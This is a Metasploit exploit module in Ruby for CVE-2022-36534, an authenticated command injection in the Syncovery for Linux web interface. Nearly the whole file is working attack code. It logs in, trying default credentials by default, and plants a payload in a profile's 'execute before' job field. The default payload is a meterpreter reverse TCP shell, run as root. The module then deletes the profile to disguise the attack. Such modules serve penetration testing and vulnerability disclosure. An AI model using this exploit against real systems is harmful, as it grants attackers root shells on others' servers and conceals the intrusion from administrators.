##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Syncovery For Linux Web-GUI Authenticated Remote Command Execution',
      'Description'    => %q{
        This module exploits an authenticated command injection vulnerability in the Web GUI of Syncovery File Sync & Backup Software for Linux.
        Successful exploitation results in remote code execution under the context of the root user.

        Syncovery allows an authenticated user to create jobs, which are executed before/after a profile is run.
        Jobs can contain arbitrary system commands and will be executed as root.
        A valid username and password or a session token is needed to exploit the vulnerability.
        The profile will be deleted afterwards to disguise the attack. IOC_IN_LOGS are present, but can be deleted manually.
        
        The vulnerability is known to work on Linux platforms. All Syncovery versions prior to v9.48j are vulnerable including all versions of branch 8.
      },
      'Author'         => [ 'Jan Rude' ],
      'License'        => MSF_LICENSE,
      'References'     => [
          ['URL', 'https://www.mgm-sp.com/en/multiple-vulnerabilities-in-syncovery-for-linux/'],
          ['CVE', '2022-36534']
        ],
      'Platform'       => 'unix',
      'Arch'           => [ ARCH_CMD ],
      'Targets'        =>
        [
          ['Syncovery for Linux < 9.48j', {}]
        ],
      'Privileged'     => true,
      'Notes' => {
          'Stability'   => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        },
      'DisclosureDate' => '2022-09-06',
      'DefaultTarget'  => 0,
      'DefaultOptions' =>
        {
          'RPORT'      => 8999,
          'Payload'    => 'cmd/unix/python/meterpreter/reverse_tcp',
          'SSL'        => false
        }
      ))

    register_options(
      [
        Opt::RPORT(8999), # Default is HTTP: 8999; HTTPS: 8943
        OptString.new('USERNAME', [true, 'The username to Syncovery (default: default)', 'default']),
        OptString.new('PASSWORD', [true, 'The password to Syncovery (default: pass)', 'pass']),
        OptString.new('TOKEN', [false, 'A valid session token', '']),
        OptString.new('TARGETURI', [true, 'The path to Syncovery', '/']),
      ]
    )
  end

  def check
    begin
      res = send_request_cgi(
        'uri'       => normalize_uri(target_uri.path, '/get_global_variables'),
        'method'    => 'GET'
      )
      fail_with(Failure::Unreachable, "#{peer} - Could not connect to host - no response") if res.nil?
      fail_with(Failure::UnexpectedReply, "#{peer} - Error (response code: #{res.code})") if res.code != 200
      
      if res.code == 200
        if res.body.scan(/"isSyncoveryLinux":"true"/).flatten[0] || res.body.scan(/"isSyncoveryWindows":"false"/).flatten[0]
          version = res.body.scan(/"SyncoveryTitle":"Syncovery\s([A-Za-z0-9\.]+)/).flatten[0] || ''
          if version.empty?
            vprint_warning("#{rhost}:#{rport} - Could not identify version")
            Exploit::CheckCode::Detected
          elsif Gem::Version.new(version) < Gem::Version.new('9.48j')
            vprint_good("#{rhost}:#{rport} - Syncovery #{version}")
            Exploit::CheckCode::Vulnerable
          else
            vprint_status("#{rhost}:#{rport} - Syncovery #{version}")
            Exploit::CheckCode::Safe
          end
        else
          Exploit::CheckCode::Safe
        end
      end
    rescue Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Could not connect to host")
    end
  end

  def exploit
    token = datastore['TOKEN']
    if token.blank?
      res = send_request_cgi({
        'uri' => normalize_uri(target_uri.path, "/post_applogin.php?login=#{datastore['USERNAME']}&password=#{datastore['PASSWORD']}"),
        'method' => 'GET'
      })

      unless res
        fail_with(Failure::UnexpectedReply, "#{peer} - Did not respond to authentication request")
      end

      # After login, the application should give us a new token
      # session_token is actually just base64(MM/dd/yyyy HH:mm:ss) at the time of the login
      token = res.body.scan(/"session_token":"((?:[A-Za-z0-9+\/]{4})*(?:[A-Za-z0-9+\/]{2}==|[A-Za-z0-9+\/]{3}=)?)"/).flatten[0] || ''    
      if token.blank?
        fail_with(Failure::NoAccess, "#{peer} - Invalid credentials!")
      else
        vprint_good("#{rhost}:#{rport} - Login successful")
      end
    end

    # send payload
    profile_name = Rex::Text.rand_text_alpha_lower(20)
    json_body = {
        'ProfileName' => profile_name,
        'Action' => 'Insert',
        'FormName' => 'synapp_profile_editor_form',
        'token' => token,
        'Name' => profile_name,
        'LeftPath' => '/dev/null',
        'RightPath' => '/dev/null',
        'Job_ExecuteBefore' => payload.encoded
      }
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/post_profilesettings.php'),
      'headers' => {
        'X-Requested-With' => 'XMLHttpRequest',
        'Content-Type' => 'application/x-www-form-urlencoded; charset=UTF-8'
      },
      'data' => JSON.generate(json_body)
    })

    if res && res.code == 200 
      if (res.body.to_s).include? "Session Expired"
        fail_with(Failure::UnexpectedReply, "#{peer} - Invalid token (Session Expired)")
      elsif (res.body.to_s).include? "Inserted"
        vprint_good("#{rhost}:#{rport} - Profile created")
      else 
        fail_with(Failure::UnexpectedReply, "#{peer} - Error (#{res.body.to_s})")
      end
    else
      fail_with(Failure::UnexpectedReply, "#{peer} - Error (response code: #{res.code})")
    end

    vprint_status("#{rhost}:#{rport} - Running profile")
    json_body = {
        'ProfileName' => profile_name,
        'token' => token,
        'attended' => true
      }
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/post_runprofile.php'),
      'data' => JSON.generate(json_body)
    })

    if res && res.code == 200
      print_good("#{rhost}:#{rport} - Exploit successfully executed")
      handler
    else
      fail_with(Failure::UnexpectedReply, "#{peer} - Could not run profile (response code: #{res.code})")
    end

    # Delete profile to disguise attack in Web GUI
    sleep_time = rand(4..10) 
    sleep(sleep_time)
    vprint_status("#{rhost}:#{rport} - Trying to delete profile")
    json_body = {
        'ProfileName' => profile_name,
        'token' => token
      }
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/post_deleteprofile.php'),
      'data' => JSON.generate(json_body)
    })

    if res && res.code == 200 && ((res.body.to_s).include? "Deleted")
      vprint_good("#{rhost}:#{rport} - Profile successfully deleted")
    else
      print_error("#{rhost}:#{rport} - Could not delete profile (#{res.body.to_s})")
    end
  end

end
